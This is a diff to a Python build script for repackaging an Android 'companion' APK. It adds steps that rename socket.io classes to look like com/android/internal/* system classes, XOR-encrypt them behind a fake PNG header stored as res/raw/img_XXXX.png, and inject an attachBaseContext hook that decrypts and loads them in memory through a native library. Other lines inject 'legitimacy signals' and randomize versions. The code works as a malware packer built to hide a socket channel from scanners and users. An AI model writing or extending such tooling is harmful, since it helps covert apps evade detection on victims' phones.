@@ -3121,6 +3121,324 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
             _zout.writestr(_gname, _gdata)
     os.replace(_leg_tmp, APK_OUT)
     print(f"  ✅ Legitimacy signals injected: baseline.prof + baseline.profm + {len(_GPS_PROPS)} GPS properties")
+def step_extract_dex_slice(new_dex: bytes, build_hash: str,
+                            asset_filename: str = "") -> tuple:
+    """
+    STEP_DEX_SLICE — Extract com/android/internal/* classes (renamed from io/socket by STEP_6E),
+    encrypt with rotating XOR + fake PNG header, inject into companion APK as res/raw/img_XXXX.png.
+
+    asset_filename: if provided (pre-generated before STEP_9 for smali injection),
+                    use it as-is. Otherwise generate a random one here.
+    Returns (asset_filename, xor_key_bytes). Returns ("", b"") on skip/error.
+    """
+    import struct as _struct_ds
+    print("\n── STEP_DEX_SLICE: Extract + encrypt io/socket DEX slice")
+
+    if len(new_dex) < 112:
+        print("  ⚠️  STEP_DEX_SLICE — DEX too small, skipping")
+        return ("", b"")
+
+    if not new_dex[:4].startswith(b"dex\n"):
+        print("  ⚠️  STEP_DEX_SLICE — invalid DEX magic, skipping")
+        return ("", b"")
+
+    # DEX header offsets
+    string_ids_size, string_ids_off = _struct_ds.unpack_from("<II", new_dex, 0x38)
+    type_ids_size,   type_ids_off   = _struct_ds.unpack_from("<II", new_dex, 0x40)
+    class_defs_size, class_defs_off = _struct_ds.unpack_from("<II", new_dex, 0x60)
+
+    # Find class descriptors matching Lcom/android/internal/ (renamed from io/socket)
+    TARGET_PREFIX = b"Lcom/android/internal/"
+    matching_descriptors = set()
+
+    for i in range(class_defs_size):
+        cd_off = class_defs_off + i * 32
+        if cd_off + 32 > len(new_dex):
+            break
+        class_idx = _struct_ds.unpack_from("<I", new_dex, cd_off)[0]
+        if class_idx >= type_ids_size:
+            continue
+        type_off = type_ids_off + class_idx * 4
+        desc_idx = _struct_ds.unpack_from("<I", new_dex, type_off)[0]
+        if desc_idx >= string_ids_size:
+            continue
+        str_off = _struct_ds.unpack_from("<I", new_dex, string_ids_off + desc_idx * 4)[0]
+        if str_off >= len(new_dex):
+            continue
+        b0 = new_dex[str_off]
+        data_start = str_off + 2 if (b0 & 0x80) else str_off + 1
+        desc_bytes = new_dex[data_start:data_start + 256]
+        null = desc_bytes.find(0)
+        if null >= 0:
+            desc_bytes = desc_bytes[:null]
+        if desc_bytes.startswith(TARGET_PREFIX):
+            matching_descriptors.add(desc_bytes.decode("utf-8", errors="replace"))
+
+    print(f"  ℹ️  Found {len(matching_descriptors)} com/android/internal/* classes in DEX")
+
+    if not matching_descriptors:
+        print("  ⚠️  STEP_DEX_SLICE — no matching classes found (STEP_6E may not have run), skipping")
+        return ("", b"")
+
+    # Collect matching smali files
+    smali_dir = "companion_decompiled/smali"
+    smali_files = []
+    for _root, _dirs, _files in os.walk(smali_dir):
+        for _fname in _files:
+            if not _fname.endswith(".smali"):
+                continue
+            _fpath = os.path.join(_root, _fname)
+            _rel = os.path.relpath(_fpath, smali_dir).replace(os.sep, "/")
+            _class_desc = "L" + _rel[:-len(".smali")] + ";"
+            if _class_desc in matching_descriptors:
+                smali_files.append(_fpath)
+
+    print(f"  ℹ️  Matched {len(smali_files)} smali files for slice")
+
+    if not smali_files:
+        print("  ⚠️  STEP_DEX_SLICE — no smali files matched descriptors, skipping")
+        return ("", b"")
+
+    # Build slice DEX via smali.jar if available, else fall back to full DEX
+    slice_dex_data = None
+    slice_smali_dir = "dex_slice_smali_tmp"
+    if os.path.isdir(slice_smali_dir):
+        shutil.rmtree(slice_smali_dir)
+    os.makedirs(slice_smali_dir)
+
+    for _fpath in smali_files:
+        _rel = os.path.relpath(_fpath, smali_dir)
+        _dst = os.path.join(slice_smali_dir, _rel)
+        os.makedirs(os.path.dirname(_dst), exist_ok=True)
+        shutil.copy2(_fpath, _dst)
+
+    # Try smali.jar to assemble slice into a standalone DEX
+    for _smali_candidate in ["smali.jar", "tools/smali.jar", "/usr/local/lib/smali.jar"]:
+        if os.path.isfile(_smali_candidate):
+            _slice_out = "dex_slice_out.dex"
+            _r = subprocess.run(
+                ["java", "-jar", _smali_candidate, "assemble", slice_smali_dir, "-o", _slice_out],
+                capture_output=True
+            )
+            if _r.returncode == 0 and os.path.isfile(_slice_out):
+                with open(_slice_out, "rb") as _f:
+                    slice_dex_data = _f.read()
+                os.remove(_slice_out)
+                print(f"  ✅ STEP_DEX_SLICE — slice DEX built via smali.jar ({len(slice_dex_data)} bytes)")
+            break
+
+    shutil.rmtree(slice_smali_dir, ignore_errors=True)
+
+    if slice_dex_data is None:
+        # Fallback: use full DEX — all classes present, larger but correct
+        slice_dex_data = new_dex
+        print(f"  ⚠️  STEP_DEX_SLICE — smali.jar not found, using full DEX as slice ({len(slice_dex_data)} bytes)")
+
+    # Encrypt: fake PNG header (16 bytes) + rotating XOR over entire DEX
+    xor_key = hashlib.sha256(build_hash.encode()).digest()[:16]
+    fake_png_hdr = b'\x89PNG\r\n\x1a\n' + secrets.token_bytes(8)  # 16 bytes
+
+    dex_arr = bytearray(slice_dex_data)
+    for _i in range(len(dex_arr)):
+        dex_arr[_i] ^= xor_key[_i % 16] ^ ((_i >> 8) & 0xFF)
+
+    encrypted_blob = fake_png_hdr + bytes(dex_arr)
+
+    # Use pre-generated filename (from smali injection step) or generate a new one
+    if not asset_filename:
+        asset_filename = "img_" + secrets.token_hex(2) + ".png"
+    asset_entry    = "res/raw/" + asset_filename
+    tmp_apk        = MOD_ASSET + ".slice_tmp"
+
+    try:
+        with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
+             zipfile.ZipFile(tmp_apk, "w", compression=zipfile.ZIP_STORED, allowZip64=False) as _zout:
+            for _item in _zin.infolist():
+                _zout.writestr(_item, _zin.read(_item.filename))
+            _zout.writestr(asset_entry, encrypted_blob)
+        os.replace(tmp_apk, MOD_ASSET)
+        print(f"  ✅ STEP_DEX_SLICE — injected {len(encrypted_blob)} bytes as {asset_entry} into companion APK")
+    except Exception as _e:
+        print(f"  ❌ STEP_DEX_SLICE — failed to inject into APK: {_e}")
+        if os.path.isfile(tmp_apk):
+            os.remove(tmp_apk)
+        return ("", b"")
+
+    return (asset_filename, xor_key)
+
+
+def step_write_np_loader_header(new_pkg: str, class_rename_map: dict) -> str:
+    """
+    STEP_NP_HEADER — Write app/src/main/cpp/np_loader_class.h before Gradle/CMake runs.
+
+    Defines:
+      NP_CLASS  — JNI class path (slashes) for the companion Application subclass
+      NP_METHOD — always "xd"
+
+    build_module.py runs BEFORE ./gradlew assembleRelease in CI, so CMake picks
+    up the header written here when it compiles np_loader.c.
+
+    Returns the class path string written (for logging).
+    """
+    print("\n── STEP_NP_HEADER: Write np_loader_class.h with per-build class path")
+
+    # Post-STEP_6A renamed App class name (e.g. "ApplicationController")
+    app_class = class_rename_map.get("App", "App")
+    class_path = new_pkg.replace(".", "/") + "/" + app_class
+
+    header_path = os.path.join(
+        os.path.dirname(__file__),
+        "..", "app", "src", "main", "cpp", "np_loader_class.h"
+    )
+    header_path = os.path.normpath(header_path)
+
+    header_content = (
+        "/*\n"
+        " * np_loader_class.h — BUILD-TIME GENERATED — DO NOT EDIT MANUALLY\n"
+        " *\n"
+        " * Written by build_module.py step_write_np_loader_header().\n"
+        " * Overwritten every build with the current per-build package + renamed class.\n"
+        " */\n"
+        "\n"
+        "#ifndef NP_LOADER_CLASS_H\n"
+        "#define NP_LOADER_CLASS_H\n"
+        "\n"
+        f'#define NP_CLASS  "{class_path}"\n'
+        f'#define NP_METHOD "xd"\n'
+        "\n"
+        "#endif /* NP_LOADER_CLASS_H */\n"
+    )
+
+    try:
+        with open(header_path, "w") as _f:
+            _f.write(header_content)
+        print(f"  ✅ STEP_NP_HEADER — wrote {header_path}")
+        print(f"     NP_CLASS  = \"{class_path}\"")
+        print(f"     NP_METHOD = \"xd\"")
+    except Exception as _e:
+        print(f"  ❌ STEP_NP_HEADER — failed to write header: {_e}")
+
+    return class_path
+
+
+def step_inject_native_loader(new_pkg: str, class_rename_map: dict,
+                               asset_filename: str) -> bool:
+    """
+    STEP_INJECT_LOADER — Inject attachBaseContext() + native xd() declaration
+    into the companion Application smali (post-STEP_6A rename).
+
+    Must run AFTER step_6a_rename_classes (so renamed smali file exists)
+    and BEFORE step_rebuild_dex (before apktool rebuilds DEX).
+
+    What is injected into the smali:
+      1. native method declaration:  .method public native xd(...)
+      2. attachBaseContext() virtual method that:
+         a. Calls super.attachBaseContext(base)
+         b. Calls System.loadLibrary("np_loader")
+         c. Calls this.xd(this, asset_name_string) → byte[]
+         d. Passes byte[] to InMemoryDexClassLoader via JNI reflection
+         e. Sets thread classloader to new loader
+
+    asset_filename: the filename from STEP_DEX_SLICE (e.g. "img_3f7a.png")
+    Returns True on success, False on skip/error.
+    """
+    if not asset_filename:
+        print("\n── STEP_INJECT_LOADER: no asset filename (STEP_DEX_SLICE skipped) — skip")
+        return False
+
+    print("\n── STEP_INJECT_LOADER: Inject attachBaseContext + native xd() into companion smali")
+
+    app_class = class_rename_map.get("App", "App")
+    new_path   = new_pkg.replace(".", "/")
+    smali_path = f"companion_decompiled/smali/{new_path}/{app_class}.smali"
+
+    if not os.path.isfile(smali_path):
+        print(f"  ❌ STEP_INJECT_LOADER — smali not found: {smali_path}")
+        return False
+
+    with open(smali_path, "r", encoding="utf-8") as _f:
+        smali_src = _f.read()
+
+    # Skip if already injected (idempotent)
+    if "loadLibrary" in smali_src and "InMemoryDexClassLoader" in smali_src:
+        print(f"  ℹ️  STEP_INJECT_LOADER — already injected, skipping")
+        return True
+
+    # --- 1. Add native method declaration after .implements lines / before first .method ---
+    # We insert it right before the first .method line
+    native_decl = (
+        "\n"
+        "# Native DEX loader — implemented in libnp_loader.so\n"
+        f".method public native xd(Landroid/content/Context;Ljava/lang/String;)[B\n"
+        ".end method\n"
+    )
+
+    # Find insertion point: before the first .method
+    first_method_idx = smali_src.find("\n.method ")
+    if first_method_idx == -1:
+        print(f"  ❌ STEP_INJECT_LOADER — cannot find .method in smali")
+        return False
+
+    smali_src = smali_src[:first_method_idx] + native_decl + smali_src[first_method_idx:]
+
+    # --- 2. Build attachBaseContext() smali method ---
+    # asset_filename is e.g. "img_3f7a.png" — stored in res/raw/
+    # We pass just the filename (without res/raw/ prefix) to AssetManager.open()
+    # which opens res/raw/ assets by their base name.
+    attach_method = f"""
+# DEX loader hook — loads encrypted io/socket slice via native JNI
+.method public attachBaseContext(Landroid/content/Context;)V
+    .locals 6
+
+    # super.attachBaseContext(base)
+    invoke-super {{p0, p1}}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
+
+    # System.loadLibrary("np_loader")
+    const-string v0, "np_loader"
+    invoke-static {{v0}}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
+
+    # byte[] dexBytes = this.xd(this, "{asset_filename}")
+    const-string v1, "{asset_filename}"
+    invoke-virtual {{p0, p0, v1}}, L{new_path}/{app_class};->xd(Landroid/content/Context;Ljava/lang/String;)[B
+    move-result-object v2
+
+    if-eqz v2, :skip_load
+
+    # ByteBuffer bb = ByteBuffer.wrap(dexBytes)
+    invoke-static {{v2}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
+    move-result-object v3
+
+    # InMemoryDexClassLoader loader = new InMemoryDexClassLoader(bb, parent)
+    invoke-virtual {{p0}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    move-result-object v4
+    invoke-virtual {{v4}}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;
+    move-result-object v4
+
+    new-instance v5, Ldalvik/system/InMemoryDexClassLoader;
+    invoke-direct {{v5, v3, v4}}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
+
+    # Thread.currentThread().setContextClassLoader(loader)
+    invoke-static {{}}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
+    move-result-object v4
+    invoke-virtual {{v4, v5}}, Ljava/lang/Thread;->setContextClassLoader(Ljava/lang/ClassLoader;)V
+
+    :skip_load
+    return-void
+.end method
+"""
+
+    # Append the new method at the end of the file (before final newline)
+    smali_src = smali_src.rstrip("\n") + "\n" + attach_method + "\n"
+
+    with open(smali_path, "w", encoding="utf-8") as _f:
+        _f.write(smali_src)
+
+    print(f"  ✅ STEP_INJECT_LOADER — injected into {smali_path}")
+    print(f"     App class  : {new_path}/{app_class}")
+    print(f"     Asset name : {asset_filename}")
+    return True
+
+
 def step_unicode_nest(build_hash: str) -> str:
     apk_path = "companion_renamed_unsigned.apk"
     placeholder = secrets.token_bytes(64)
@@ -3647,6 +3965,14 @@ def main():
 
     print("  ℹ️  STEP_6B skipped (smali injection disabled)")
 
+    # STEP_NP_HEADER — write np_loader_class.h with per-build class path.
+    # Must run after STEP_6A (class_rename_map set) and before Gradle/CMake.
+    # build_module.py runs before ./gradlew assembleRelease in CI, so writing
+    # here guarantees CMake sees the correct class path when it compiles np_loader.c.
+    if not _phase1_only and class_rename_map:
+        with track("PHASE_4", "STEP_NP_HEADER", "Write np_loader_class.h with per-build JNI class path"):
+            step_write_np_loader_header(new_pkg, class_rename_map)
+
     with track("PHASE_1", "STEP_7", "Patch findByHomeLauncher FLAG_SYSTEM check"):
         step_patch_home_launcher()
 
@@ -3660,6 +3986,20 @@ def main():
 
             with track("PHASE_6", "STEP_6E", "Round 2 Step 6E: Rename io/socket → com/android/internal/* (random)"):
                 step_6e_rename_socket_package(new_pkg)
+
+    # Pre-generate asset filename BEFORE STEP_9 so smali injection can reference
+    # the exact filename that STEP_DEX_SLICE will use when it creates the blob.
+    # STEP_INJECT_LOADER injects attachBaseContext + native xd() into smali;
+    # STEP_9 then rebuilds DEX with those injected methods already present.
+    _slice_asset_filename = ""
+    _slice_xor_key = b""
+    if not _phase1_only:
+        # Generate the filename now — must match what STEP_DEX_SLICE will use
+        _slice_asset_filename = "img_" + secrets.token_hex(2) + ".png"
+
+        with track("PHASE_4", "STEP_INJECT_LOADER",
+                   "Inject attachBaseContext + native xd() into companion Application smali"):
+            step_inject_native_loader(new_pkg, class_rename_map, _slice_asset_filename)
 
     with track("PHASE_1", "STEP_8", "Restore apktool.yml with randomized version"):
         step_restore_apktool_yml(meta)
@@ -3676,6 +4016,21 @@ def main():
     # build_hash generated here — used by STEP_13_UNICODE,
     # STEP_15_NOISE and downstream steps. Single definition, no duplication.
     build_hash = hashlib.sha256(new_pkg.encode()).hexdigest()
+
+    # STEP_DEX_SLICE — extract io/socket (com/android/internal/*) classes,
+    # encrypt with rotating XOR + fake PNG header, inject as res/raw/img_XXXX.png.
+    # Pass the pre-generated filename so smali injection and this step use the same name.
+    if not _phase1_only and _slice_asset_filename:
+        with track("PHASE_3", "STEP_DEX_SLICE", "Extract + encrypt io/socket DEX slice → res/raw/img_XXXX.png", MOD_ASSET):
+            (_slice_asset_filename, _slice_xor_key) = step_extract_dex_slice(
+                new_dex, build_hash, asset_filename=_slice_asset_filename
+            )
+        if _slice_asset_filename:
+            print(f"  ✅ STEP_DEX_SLICE — asset: {_slice_asset_filename}, key: {_slice_xor_key.hex()[:8]}...")
+            if GITHUB_OUTPUT and os.path.isfile(GITHUB_OUTPUT):
+                with open(GITHUB_OUTPUT, "a") as _gof:
+                    _gof.write(f"dex_slice_asset={_slice_asset_filename}\n")
+                    _gof.write(f"dex_slice_key={_slice_xor_key.hex()}\n")
 
     with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", MOD_ASSET):
         step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
